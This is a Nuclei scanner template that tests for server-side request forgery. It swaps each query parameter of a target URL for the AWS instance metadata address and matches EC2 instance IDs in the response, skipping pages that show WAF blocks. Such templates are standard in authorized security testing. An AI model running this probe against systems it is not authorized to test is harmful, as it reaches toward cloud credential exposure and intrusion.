id: nawab-confirmed-ssrf-strict

info:
  name: 🛸 Nawab-SSRF-Strict 🛸
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      ssrf_targets:
        - "http://169.254.169.254/latest/meta-data/instance-id"

    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{ssrf_targets}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "i-[a-f0-9]{17}"
          - "i-[a-f0-9]{8}"

      - type: word
        part: body
        negative: true
        words:
          - "Cloudflare"
          - "Just a moment"
          - "Access Denied"
          - "DDoS protection"
